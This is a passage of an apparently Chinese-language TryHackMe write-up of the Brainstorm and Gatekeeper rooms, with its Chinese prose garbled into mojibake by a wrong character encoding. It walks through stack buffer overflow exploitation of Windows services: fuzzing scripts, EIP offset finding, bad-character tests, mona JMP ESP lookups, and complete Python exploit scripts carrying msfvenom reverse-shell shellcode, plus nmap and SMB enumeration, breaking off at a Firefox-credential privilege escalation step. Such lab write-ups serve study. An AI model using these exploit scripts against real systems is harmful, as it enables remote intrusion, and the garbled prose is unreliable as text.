è¾“ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•åˆ‡æ¢åˆ°äºŒè¿›åˆ¶æ¨¡å¼æ¥ä¼ è¾“æ–‡ä»¶ æ¥ç€thmæç¤ºæˆ‘ä»¬ï¼š æšä¸¾åï¼Œæ‚¨ç°åœ¨ä¸€å®šå·²ç»æ³¨æ„åˆ°ï¼Œåœ¨é™Œç”Ÿç«¯å£ä¸Šäº¤äº’çš„æœåŠ¡ä¸æ‚¨æ‰¾åˆ°çš„æ–‡ä»¶æœ‰æŸç§å…³ç³»ï¼æ— è®ºå¦‚ä½•ï¼Œæ‚¨å¯ä»¥åˆ©ç”¨è¯¥å¥‡æ€ªçš„æœåŠ¡æ¥è®¿é—®ç³»ç»Ÿå—ï¼Ÿ å€¼å¾—ä½¿ç”¨ Python è„šæœ¬æ¥å°è¯•ä¸åŒçš„æœ‰æ•ˆè´Ÿè½½æ¥è·å¾—è®¿é—®æƒé™ï¼æ‚¨ç”šè‡³å¯ä»¥ä½¿ç”¨è¿™äº›æ–‡ä»¶åœ¨æœ¬åœ°å°è¯•è¯¥æ¼æ´ã€‚ è¿›ä¸€æ­¥å¯¹9999è¿›è¡Œæšä¸¾ï¼Œå‘ç°è¿™äº›å…³é”®è¯ï¼Œå¯ä»¥æƒ³åˆ°ä¸å…ˆå‰çš„chatserveräºŒè¿›åˆ¶æ–‡ä»¶æœ‰å…³ï¼Œä¹Ÿå°±æ˜¯è€ƒå¯Ÿç¼“å†²åŒºæº¢å‡ºæ¼æ´ Fuzzing ä¸ä¼šæ”¹è„šæœ¬ã€‚ã€‚ã€‚ã€‚æ‰‹åŠ¨è·Ÿç€è§†é¢‘åšå§ã€‚é¦–å…ˆå°±æ˜¯ç¡®å®šcrashedçš„å­—ç¬¦æ•°ï¼Œç›´æ¥ç”¨pythonç”Ÿæˆä¸€ä¸ª5000é•¿åº¦çš„Aå­—ç¬¦ï¼Œå‘é€ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤º è¿™é‡Œçœ‹åˆ°usernameæ²¡æœ‰ç¼ºé™·ï¼Œä½†æ˜¯å½“æˆ‘ä»¬åœ¨messageä¸­å‘é€é•¿å­—ç¬¦ï¼Œå¦‚ä¸‹å›¾ï¼Œå‘ç°EBPã€EIPéƒ½è¢«Aè¦†ç›–æ‰äº†ï¼Œå­˜åœ¨ç¼“å†²åŒºæº¢å‡º å¯»æ‰¾EIP çœ‹åˆ°å¼‚å¸¸pausedï¼Œæ¥ä¸‹æ¥å°±æ˜¯å¾—åˆ°EIPçš„èµ·å§‹åœ°å€ offset äº†ï¼Œåˆ©ç”¨msfç”Ÿæˆè¶³å¤Ÿè®©è¯¥ç¨‹åºæº¢å‡ºçš„é•¿åº¦å­—ç¬¦ã€‚ å¦‚ä¸‹å›¾ï¼Œèƒ½çœ‹åˆ°è¿™é‡ŒEIPçš„åœ°å€ä¸º31704330ï¼Œæˆ‘ä»¬ç»§ç»­åˆ©ç”¨msfçœ‹ä¸€ä¸‹å¯¹åº”çš„offsetæ˜¯ä»€ä¹ˆ å¾—åˆ°2012åç§»é‡ï¼Œå½“ç„¶è¿™é‡Œåˆ©ç”¨monaä¹Ÿå¯ä»¥å¾—åˆ°2012 æ¥ä¸‹æ¥å†™è„šæœ¬ï¼Œç¡®å®šæˆ‘ä»¬èƒ½å¤Ÿè¦†ç›–EIPäº†ã€‚ import socket ip = \"192.168.246.232\" port = 9999 username = \"hybcx\" #prefix = \"OVERFLOW7 \" prefix = \"\" offset = 2012 overflow = \"A\" * offset retn = \"BBBB\" padding = \"\" payload = \"\" postfix = \"\" buffer = prefix + overflow + retn + padding + payload + postfix s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: s.connect((ip, port)) print(\"Sending evil buffer...\") s.recv(1024) s.send(bytes(username + \"\\r \", \"latin-1\")) s.recv(1024) print(\"message:\") s.send(bytes(buffer + '\\r ', \"latin-1\")) print(\"Done!\") except: print(\"Could not connect.\") å¦‚ä¸‹å›¾ï¼Œè¯æ˜æˆ‘ä»¬å¯»æ‰¾çš„EIPåœ°å€æ˜¯æ­£ç¡®çš„ ç¡®å®šbadchars æ¥ä¸‹æ¥å°±æ˜¯å¯»æ‰¾badcharsï¼Œä»¥ä¾¿æˆ‘ä»¬ç”Ÿæˆshellcode å¦‚ä¸‹å›¾ï¼Œè¿™é‡Œæµ‹è¯•ä¹‹åå‘ç°å¹¶æ²¡æœ‰badcharsï¼Œè‡³äºåŸå› ï¼Œåœ¨åé¢åœ¨è®¨è®º ä¸‹é¢æ˜¯ç”¨äºæµ‹è¯•badcharsçš„è„šæœ¬ import socket ip = \"192.168.246.232\" port = 9999 username = \"hybcx\" #prefix = \"OVERFLOW7 \" prefix = \"\" offset = 2012 overflow = \"A\" * offset retn = \"BBBB\" padding = \"\" payload = \"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\" postfix = \"\" buffer = prefix + overflow + retn + padding + payload + postfix s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: s.connect((ip, port)) print(\"Sending evil buffer...\") s.recv(1024) s.send(bytes(username + \"\\r \", \"latin-1\")) s.recv(1024) print(\"message:\") s.send(bytes(buffer + '\\r ', \"latin-1\")) print(\"Done!\") except: print(\"Could not connect.\") åˆ©ç”¨monaï¼Œå¾—åˆ°espåœ°å€ï¼Œè¿™é‡Œæˆ‘é€‰æ‹©ç¬¬ä¸€ä¸ªï¼š !mona jmp -r esp -cpb \"\\x00\" =ã€‹0x625014df=ã€‹\\xdf\\x14\\x50\\x62 ç¼“å†²åŒºæº¢å‡ºæ‹¿åˆ°shell é‚£æˆ‘ä»¬å°±èƒ½ç›´æ¥ç¼–å†™expäº†ï¼Œå°†IPæ”¹ä¸€ä¸‹ï¼Œç„¶åmsfç”Ÿæˆshellcode è„šæœ¬å¦‚ä¸‹ import socket ip = \"10.10.207.193\" port = 9999 username = \"hybcx\" #prefix = \"OVERFLOW7 \" prefix = \"\" offset = 2012 overflow = \"A\" * offset retn = \"\\xdf\\x14\\x50\\x62\" padding = \"\\x90\" * 32 payload = \"\" payload += \"\\xdb\\xd3\\xb8\\x4c\\xbf\\x83\\xc9\\xd9\\x74\\x24\\xf4\\x5d\" payload += \"\\x2b\\xc9\\xb1\\x52\\x31\\x45\\x17\\x83\\xed\\xfc\\x03\\x09\" payload += \"\\xac\\x61\\x3c\\x6d\\x3a\\xe7\\xbf\\x8d\\xbb\\x88\\x36\\x68\" payload += \"\\x8a\\x88\\x2d\\xf9\\xbd\\x38\\x25\\xaf\\x31\\xb2\\x6b\\x5b\" payload += \"\\xc1\\xb6\\xa3\\x6c\\x62\\x7c\\x92\\x43\\x73\\x2d\\xe6\\xc2\" payload += \"\\xf7\\x2c\\x3b\\x24\\xc9\\xfe\\x4e\\x25\\x0e\\xe2\\xa3\\x77\" payload += \"\\xc7\\x68\\x11\\x67\\x6c\\x24\\xaa\\x0c\\x3e\\xa8\\xaa\\xf1\" payload += \"\\xf7\\xcb\\x9b\\xa4\\x8c\\x95\\x3b\\x47\\x40\\xae\\x75\\x5f\" payload += \"\\x85\\x8b\\xcc\\xd4\\x7d\\x67\\xcf\\x3c\\x4c\\x88\\x7c\\x01\" payload += \"\\x60\\x7b\\x7c\\x46\\x47\\x64\\x0b\\xbe\\xbb\\x19\\x0c\\x05\" payload += \"\\xc1\\xc5\\x99\\x9d\\x61\\x8d\\x3a\\x79\\x93\\x42\\xdc\\x0a\" payload += \"\\x9f\\x2f\\xaa\\x54\\xbc\\xae\\x7f\\xef\\xb8\\x3b\\x7e\\x3f\" payload += \"\\x49\\x7f\\xa5\\x9b\\x11\\xdb\\xc4\\xba\\xff\\x8a\\xf9\\xdc\" payload += \"\\x5f\\x72\\x5c\\x97\\x72\\x67\\xed\\xfa\\x1a\\x44\\xdc\\x04\" payload += \"\\xdb\\xc2\\x57\\x77\\xe9\\x4d\\xcc\\x1f\\x41\\x05\\xca\\xd8\" payload += \"\\xa6\\x3c\\xaa\\x76\\x59\\xbf\\xcb\\x5f\\x9e\\xeb\\x9b\\xf7\" payload += \"\\x37\\x94\\x77\\x07\\xb7\\x41\\xd7\\x57\\x17\\x3a\\x98\\x07\" payload += \"\\xd7\\xea\\x70\\x4d\\xd8\\xd5\\x61\\x6e\\x32\\x7e\\x0b\\x95\" payload += \"\\xd5\\x8b\\xc7\\xd4\\xee\\xe4\\xd5\\xd6\\xe5\\x47\\x50\\x30\" payload += \"\\x6f\\xb8\\x35\\xeb\\x18\\x21\\x1c\\x67\\xb8\\xae\\x8a\\x02\" payload += \"\\xfa\\x25\\x39\\xf3\\xb5\\xcd\\x34\\xe7\\x22\\x3e\\x03\\x55\" payload += \"\\xe4\\x41\\xb9\\xf1\\x6a\\xd3\\x26\\x01\\xe4\\xc8\\xf0\\x56\" payload += \"\\xa1\\x3f\\x09\\x32\\x5f\\x19\\xa3\\x20\\xa2\\xff\\x8c\\xe0\" payload += \"\\x79\\x3c\\x12\\xe9\\x0c\\x78\\x30\\xf9\\xc8\\x81\\x7c\\xad\" payload += \"\\x84\\xd7\\x2a\\x1b\\x63\\x8e\\x9c\\xf5\\x3d\\x7d\\x77\\x91\" payload += \"\\xb8\\x4d\\x48\\xe7\\xc4\\x9b\\x3e\\x07\\x74\\x72\\x07\\x38\" payload += \"\\xb9\\x12\\x8f\\x41\\xa7\\x82\\x70\\x98\\x63\\xa2\\x92\\x08\" payload += \"\\x9e\\x4b\\x0b\\xd9\\x23\\x16\\xac\\x34\\x67\\x2f\\x2f\\xbc\" payload += \"\\x18\\xd4\\x2f\\xb5\\x1d\\x90\\xf7\\x26\\x6c\\x89\\x9d\\x48\" payload += \"\\xc3\\xaa\\xb7\" postfix = \"\" buffer = prefix + overflow + retn + padding + payload + postfix s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: s.connect((ip, port)) print(\"Sending evil buffer...\") s.recv(1024) s.send(bytes(username + \"\\r \", \"latin-1\")) s.recv(1024) print(\"message:\") s.send(bytes(buffer + '\\r ', \"latin-1\")) print(\"Done!\") except: print(\"Could not connect.\") è¿è¡Œä¹‹å‰ï¼Œæœ¬åœ°ç›‘å¬ï¼Œå¾—åˆ°shellï¼Œroot.txtåœ¨å¦‚å›¾æ‰€ç¤ºä½ç½® æ€»ç»“ å¸¸è§„IPæ‰«æï¼Œå‘ç°ftpæœåŠ¡ã€‚è‚¯å®šæ˜¯è¦ä¸Šå»çœ‹ä¸€ä¸‹çš„ï¼Œç„¶åå‘ç°é‡Œé¢å­˜åœ¨ä¸€ä¸ªæœ‰ç¼“å†²åŒºæº¢å‡ºæ¼æ´çš„exeæ–‡ä»¶ã€‚å½“ç„¶åœ¨æ­¤ä¹‹å‰æ¥è§¦åˆ°äº†æœ‰å…³ftpå‘½ä»¤ä»¥åŠè¢«åŠ¨æ¨¡å¼çš„æ— æ³•æ­£å¸¸æ‰§è¡Œå‘½ä»¤çš„æƒ…å†µã€‚ ç„¶åå°†å¾—åˆ°çš„åº”ç”¨ç¨‹åºæ”¾å…¥debuggerä¸­è¿›è¡Œè°ƒè¯•ï¼Œå…ˆfuzzå‡ºå¤§æ¦‚ä¼šå¼•å‘æº¢å‡ºçš„å­—ç¬¦é•¿åº¦ï¼Œç„¶ååœ¨å‘é€å¯¹åº”é•¿åº¦çš„å­—ç¬¦æ•°æ®ï¼Œå¾—åˆ°ç²¾ç¡®çš„EIPçš„èµ·å§‹åœ°å€offsetï¼Œéšåå‘é€å…¨å­—ç¬¦ï¼Œæ‰¾åˆ°ä¼šå½±å“æœ€ç»ˆshellcodeæ‰§è¡Œçš„badcharsï¼Œå½“ç„¶åœ¨è¿™é‡Œèƒ½å‘ç°ESPä½ç½®ï¼Œéšååˆ©ç”¨monaå¾—åˆ°JMP ESPåœ°å€ï¼Œç„¶åå†™EXPå¾—åˆ°shellã€‚ 0x14 Gatekeeper å¸¸è§„æ‰«æ å¸¸è§„nmapæ‰«æï¼Œå¼€æ”¾ç«¯å£å¦‚ä¸Šï¼Œæˆ‘è®¤ä¸ºæœ‰æ•ˆçš„åªæœ‰ä¸Šé¢5ä¸ªã€‚åé¢çš„ä¼°è®¡æ˜¯æ‰«æé€Ÿåº¦è¿‡å¿«çš„ç¼˜æ•…ï¼Œæ¥ä¸‹æ¥è¿›è¡Œå…·ä½“ç«¯å£çš„æ‰«æï¼Œå¾—åˆ°çš„ç»“æœå¦‚ä¸‹ PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 3389/tcp open tcpwrapped |_ssl-date: 2024-06-03T01:38:44+00:00; -1s from scanner time. | rdp-ntlm-info: | Target_Name: GATEKEEPER | NetBIOS_Domain_Name: GATEKEEPER | NetBIOS_Computer_Name: GATEKEEPER | DNS_Domain_Name: gatekeeper | DNS_Computer_Name: gatekeeper | Product_Version: 6.1.7601 |_ System_Time: 2024-06-03T01:38:30+00:00 | ssl-cert: Subject: commonName=gatekeeper | Not valid before: 2024-06-02T00:50:06 |_Not valid after: 2024-12-02T00:50:06 31337/tcp open Elite? | fingerprint-strings: | FourOhFourRequest: | Hello GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0 | Hello | GenericLines: | Hello | Hello | GetRequest: | Hello GET / HTTP/1.0 | Hello | HTTPOptions: | Hello OPTIONS / HTTP/1.0 | Hello | Help: | Hello HELP | Kerberos: | Hello !!! | LDAPSearchReq: | Hello 0 | Hello | LPDString: | Hello | default!!! | RTSPRequest: | Hello OPTIONS / RTSP/1.0 | Hello | SIPOptions: | Hello OPTIONS sip:nm SIP/2.0 | Hello Via: SIP/2.0/TCP nm;branch=foo | Hello From: ;tag=root | Hello To: | Hello Call-ID: 50000 | Hello CSeq: 42 OPTIONS | Hello Max-Forwards: 70 | Hello Content-Length: 0 | Hello Contact: | Hello Accept: application/sdp | Hello | SSLSessionReq, TLSSessionReq, TerminalServerCookie: |_ Hello 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port31337-TCP:V=7.94SVN%I=7%D=6/3%Time=665D1DFD%P=x86_64-pc-linux-gnu%r SF:(GetRequest,24,\"Hello\\x20GET\\x20/\\x20HTTP/1\\.0\\r!!! Hello\\x20\\r!!! \") SF:%r(SIPOptions,142,\"Hello\\x20OPTIONS\\x20sip:nm\\x20SIP/2\\.0\\r!!! Hello\\x SF:20Via:\\x20SIP/2\\.0/TCP\\x20nm;branch=foo\\r!!! Hello\\x20From:\\x20 SF:@nm&gt;;tag=root\\r!!! Hello\\x20To:\\x20\\r!!! Hello\\x20Call-I SF:D:\\x2050000\\r!!! Hello\\x20CSeq:\\x2042\\x20OPTIONS\\r!!! Hello\\x20Max-Fo SF:rwards:\\x2070\\r!!! Hello\\x20Content-Length:\\x200\\r!!! Hello\\x20Contac SF:t:\\x20\\r!!! Hello\\x20Accept:\\x20application/sdp\\r!!! Hello SF:\\x20\\r!!! \")%r(GenericLines,16,\"Hello\\x20\\r!!! Hello\\x20\\r!!! \")%r(H SF:TTPOptions,28,\"Hello\\x20OPTIONS\\x20/\\x20HTTP/1\\.0\\r!!! Hello\\x20\\r!!!\\ SF:n\")%r(RTSPRequest,28,\"Hello\\x20OPTIONS\\x20/\\x20RTSP/1\\.0\\r!!! Hello\\x2 SF:0\\r!!! \")%r(Help,F,\"Hello\\x20HELP\\r!!! \")%r(SSLSessionReq,C,\"Hello\\x2 SF:0\\x16\\x03!!! \")%r(TerminalServerCookie,B,\"Hello\\x20\\x03!!! \")%r(TLSSe SF:ssionReq,C,\"Hello\\x20\\x16\\x03!!! \")%r(Kerberos,A,\"Hello\\x20!!! \")%r(F SF:ourOhFourRequest,47,\"Hello\\x20GET\\x20/nice%20ports%2C/Tri%6Eity\\.txt%2e SF:bak\\x20HTTP/1\\.0\\r!!! Hello\\x20\\r!!! \")%r(LPDString,12,\"Hello\\x20\\x01 SF:default!!! \")%r(LDAPSearchReq,17,\"Hello\\x200\\x84!!! Hello\\x20\\x01!!!\\ SF:n\"); Service Info: Host: GATEKEEPER; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb-os-discovery: | OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1) | OS CPE: cpe:/o:microsoft:windows_7::sp1:professional | Computer name: gatekeeper | NetBIOS computer name: GATEKEEPER\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2024-06-02T21:38:29-04:00 | smb2-security-mode: | 2:1:0: |_ Message signing enabled but not required |_nbstat: NetBIOS name: GATEKEEPER, NetBIOS user: , NetBIOS MAC: 02:00:6e:84:89:8d (unknown) | smb2-time: | date: 2024-06-03T01:38:29 |_ start_date: 2024-06-03T00:49:54 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_clock-skew: mean: 47m59s, deviation: 1h47m20s, median: -1s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 180.95 seconds æ¥ä¸‹æ¥é‡ç‚¹æšä¸¾SMB å‘ç°å­˜åœ¨å››ä¸ªå…±äº«ç”¨æˆ·ï¼Œæ¥ç€åˆ©ç”¨nmapå…·ä½“æšä¸¾445 nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.71.25 è¿™é‡Œè¿›å…¥IPCæ²¡å•¥ä¸œè¥¿ï¼Œä½†Usersæ˜¯å¯è¯»çš„ï¼Œæˆ‘ä»¬è¿›å…¥ä¹‹åä¸‹è½½ç›¸å…³æ–‡ä»¶ æ‰¾äº†åŠå¤©ä¹Ÿæ²¡å…¶ä»–ç›¸å…³æ–‡ä»¶äº†ï¼Œå°±ç›´æ¥å°†exeä¸‹è½½åˆ°æˆ‘ä»¬æœ¬åœ°ä¸Šè¿›è¡Œæµ‹è¯•ã€‚ Fuzzing ç›´æ¥debuggerè¿è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç„¶åå¼€å§‹æ¨¡ç³Šæµ‹è¯•ï¼Œè¿™é‡Œä¸çŸ¥é“ä¸ºä½•æˆ‘è„šæœ¬æ€»æ˜¯æ— æ³•è¿è¡Œï¼Œä¸å…¶ä»–æ–‡ç« çš„è„šæœ¬æ¯”è¾ƒï¼Œæ„Ÿè§‰æ²¡å•¥å‡ºå…¥ï¼Œä½†å°±æ˜¯ä¸å¯ï¼Œä¸ç†è§£ã€‚ã€‚ã€‚ è¿™é‡Œæ‰¾äº†ä¸€ä¸ªèƒ½æ­£å¸¸è¿è¡Œçš„è„šæœ¬ï¼Œpy2ç¯å¢ƒ import sys import socket from time import sleep ip = \"192.168.246.235\" # this my windows lab ip port = 31337 # the application targeted port buffer = 'A' * 50 # bufer while True: try: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((ip, port)) s.send((buffer+'\\r ')) # send the buffer over the tcp connection s.close() sleep(1) buffer += 'A' * 50 except: print \"fuzzing crashed at %s bytes\" % str(len(buffer)) # tell the attacker where the application crashed sys.exit() è¿è¡Œä¹‹åå¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œè¿™æ„å‘³ç€å´©æºƒçš„å­—ç¬¦ä¸²é•¿åº¦åœ¨150ä¹‹ä¸Š å¯»æ‰¾EIP æ¥ä¸‹æ¥ç”¨msfç”ŸæˆæŒ‡å®šé•¿åº¦çš„å­—ç¬¦ä¸² æˆ‘ä»¬ncè¿æ¥ç«¯å£ï¼Œæ¥ç€å‘é€ä¸Šè¿°æ•°æ®ï¼Œç„¶åé”®å…¥ä»¥ä¸‹å‘½ä»¤ï¼Œå¾—åˆ°EIPçš„åç§»é‡ !mona findmsp -distance 200 æ¥ä¸‹æ¥å†™è„šæœ¬ï¼Œå°è¯•è¦†ç›–EIPï¼Œè¯æ˜æˆ‘ä»¬çš„æ­£ç¡®æ€§ import socket ip = \"192.168.246.235\" port = 31337 username = \"hybcx\" #prefix = \"OVERFLOW7 \" prefix = \"\" offset = 146 overflow = \"A\" * offset retn = \"BBBB\" padding = \"\" payload = \"\" postfix = \"\" buffer = prefix + overflow + retn + padding + payload + postfix s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: s.connect((ip, port)) print(\"Sending evil buffer...\") #s.recv(1024) #s.send(bytes(username + \"\\r \", \"latin-1\")) #s.recv(1024) print(\"message:\") s.send(bytes(buffer + '\\r ', \"latin-1\")) print(\"Done!\") except: print(\"Could not connect.\") å‘é€ä¸Šè¿°è„šæœ¬ï¼Œå¦‚ä¸‹å›¾å¾—åˆ°ç»“æœï¼Œå‘ç°æˆ‘ä»¬æˆåŠŸè¦†ç›–EIP ç¡®å®šbadchars æ¥ä¸‹æ¥å°±æ˜¯å¯»æ‰¾badcharsäº†ï¼Œç›´æ¥è¿è¡Œè„šæœ¬ï¼Œä¹Ÿå°±æ˜¯å°†ä¸Šé¢çš„payloadèµ‹å€¼ä¸ºå…¨å­—ç¬¦å³å¯ éšåå‘é€å¾—åˆ°ä¸‹å›¾ æ ¹æ®ä¸Šå›¾çš„ESPåœ°å€ï¼Œæˆ‘ä»¬é”®å…¥monaå‘½ä»¤ï¼Œå¾—åˆ°å½“å‰åå­—ç¬¦ä¸º00 0aï¼Œ00æ˜¯å¿…æœ‰çš„ï¼Œè¿™é‡Œæ‡’å¾—æµ‹è¯•äº†ï¼Œç›´æ¥çŒœæµ‹0aå°±æ˜¯åå­—ç¬¦å³å¯ã€‚ Shellcodeæ‹¿shell è¿™é‡Œæˆ‘ä»¬å¯»æ‰¾JMP ESPï¼Œå¦‚ä¸‹å›¾ï¼Œåªå‘ç°ä¸¤ä¸ªï¼Œæˆ‘é€‰æ‹©ç¬¬ä¸€ä¸ªï¼š\\xc3\\x14\\x04\\x08 éšåç›´æ¥ç¼–å†™è„šæœ¬ï¼Œæ‹¿shellå³å¯ import socket ip = \"10.10.71.25\" port = 31337 username = \"hybcx\" #prefix = \"OVERFLOW7 \" prefix = \"\" offset = 146 overflow = \"A\" * offset retn = \"\\xc3\\x14\\x04\\x08\" padding = \"\\x90\" * 32 payload = \"\" payload += \"\\xbb\\x77\\xfe\\x19\\x4f\\xd9\\xe5\\xd9\\x74\\x24\\xf4\\x5a\" payload += \"\\x33\\xc9\\xb1\\x5e\\x31\\x5a\\x15\\x83\\xc2\\x04\\x03\\x5a\" payload += \"\\x11\\xe2\\x82\\x02\\xf1\\xc0\\x6c\\xfb\\x02\\xbf\\x5d\\x29\" payload += \"\\x8b\\xda\\xf9\\x46\\xde\\x14\\x8a\\x0b\\xd3\\xdf\\xde\\xbf\" payload += \"\\xda\\x20\\xd1\\x08\\x56\\xf9\\x66\\x04\\x4f\\x34\\xb8\\x45\" payload += \"\\xb3\\x57\\x44\\x94\\xe0\\xb7\\x75\\x57\\xf5\\xb6\\xb2\\x21\" payload += \"\\x73\\x56\\x6e\\xe5\\xf0\\xfa\\x9e\\x82\\x45\\xc7\\x9f\\x44\" payload += \"\\xc2\\x77\\xe7\\xe1\\x15\\x03\\x5b\\xeb\\x45\\x67\\x2b\\xf3\" payload += \"\\xee\\x20\\x8b\\x53\\xf0\\x03\\x4e\\x9a\\x86\\x9f\\x19\\x2c\" payload += \"\\x98\\x6b\\xad\\xc5\\x67\\xba\\xfc\\x19\\xa6\\x8d\\xf3\\x35\" payload += \"\\x28\\xd5\\x33\\xa6\\x5e\\x2d\\x40\\x5b\\x59\\xf6\\x3b\\x87\" payload += \"\\xec\\xe9\\x9b\\x4c\\x56\\xce\\x1a\\x80\\x01\\x85\\x10\\x6d\" payload += \"\\x45\\xc1\\x34\\x70\\x8a\\x79\\x40\\xf9\\x2d\\xae\\xc1\\xb9\" payload += \"\\x09\\x6a\\x8a\\x1a\\x33\\x2b\\x76\\xcc\\x4c\\x2b\\xde\\xb1\" payload += \"\\xe8\\x27\\xcc\\xa4\\x8d\\xc7\\x0f\\xc9\\xd3\\x5f\\xdc\\x04\" payload += \"\\xec\\x9f\\x4a\\x1e\\x9f\\xad\\xd5\\xb4\\x37\\x9e\\x9e\\x12\" payload += \"\\xcf\\x97\\x88\\xa4\\x1f\\x1f\\xd8\\x5a\\xa0\\x60\\xf1\\x98\" payload += \"\\xf4\\x30\\x69\\x08\\x75\\xdb\\x69\\xb5\\xa0\\x76\\x63\\x21\" payload += \"\\x41\\x8c\\x32\\x7a\\x3d\\x90\\xb4\\x69\\x0d\\x1d\\x52\\xc1\" payload += \"\\x21\\x4e\\xca\\xa2\\x91\\x2e\\xba\\x4a\\xf8\\xa0\\xe5\\x6b\" payload += \"\\x03\\x6b\\x8e\\x06\\xec\\xc2\\xe7\\xbe\\x95\\x4e\\x73\\x5e\" payload += \"\\x59\\x45\\xfe\\x60\\xd1\\x6c\\xff\\x2f\\x12\\x04\\x13\\x47\" payload += \"\\x45\\xe6\\xeb\\x98\\xe0\\xe6\\x81\\x9c\\xa2\\xb1\\x3d\\x9f\" payload += \"\\x93\\xf6\\xe2\\x60\\xf6\\x84\\xe4\\x9f\\x87\\xbc\\x9f\\x96\" payload += \"\\x1d\\x81\\xf7\\xd6\\xf1\\x01\\x07\\x81\\x9b\\x01\\x6f\\x75\" payload += \"\\xf8\\x51\\x8a\\x7a\\xd5\\xc5\\x07\\xef\\xd6\\xbf\\xf4\\xb8\" payload += \"\\xbe\\x3d\\x23\\x8e\\x60\\xbd\\x06\\x8c\\x67\\x41\\xd5\\xbb\" payload += \"\\xcf\\x2a\\x25\\xfc\\xef\\xaa\\x4f\\xfc\\xbf\\xc2\\x84\\xd3\" payload += \"\\x30\\x23\\x65\\xfe\\x18\\x2b\\xec\\x6f\\xea\\xca\\xf1\\xa5\" payload += \"\\xaa\\x52\\xf2\\x4a\\x77\\x64\\x89\\x23\\x88\\x85\\x6e\\x2a\" payload += \"\\xed\\x85\\x6f\\x52\\x13\\xb9\\xa6\\x6b\\x61\\xfc\\x7b\\xc8\" payload += \"\\x6a\\xe3\\x51\\x25\\x03\\xba\\x30\\x84\\x4e\\x3d\\xef\\xcb\" payload += \"\\x76\\xbe\\x05\\xb4\\x8c\\xde\\x6c\\xb1\\xc9\\x58\\x9d\\xcb\" payload += \"\\x42\\x0d\\xa1\\x78\\x62\\x04\" postfix = \"\" buffer = prefix + overflow + retn + padding + payload + postfix s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: s.connect((ip, port)) #print(\"Sending evil buffer...\") #s.recv(1024) #s.send(bytes(username + \"\\r \", \"latin-1\")) #s.recv(1024) print(\"message:\") s.send(bytes(buffer + '\\r ', \"latin-1\")) print(\"Done!\") except: print(\"Could not connect.\") è¿è¡Œä¹‹å‰å¼€ç›‘å¬ï¼Œå³å¯shell æƒé™æå‡ è¿™ç§æ€è·¯æ²¡è§è¿‡ã€‚ã€‚ã€‚ æ ¹æ®wpé˜è¿°ï¼Œè¿™é‡Œå½“å‰ç›®å½•å‘ç°firefox.lnkï¼Œè¿™æ˜¯æµè§ˆå™¨çš„å¿«æ·é”®ï¼Œç„¶åä»–å°±è”æƒ³åˆ°äº†ï¼š ä»æµè§ˆå™¨ç¼“å­˜ä¸­æ£€ç´¢ç™»å½•å‡­æ®æ˜¯æƒé™æå‡çš„è·¯å¾„ä¹‹ä¸€ï¼Œè€Œåœ¨ windows 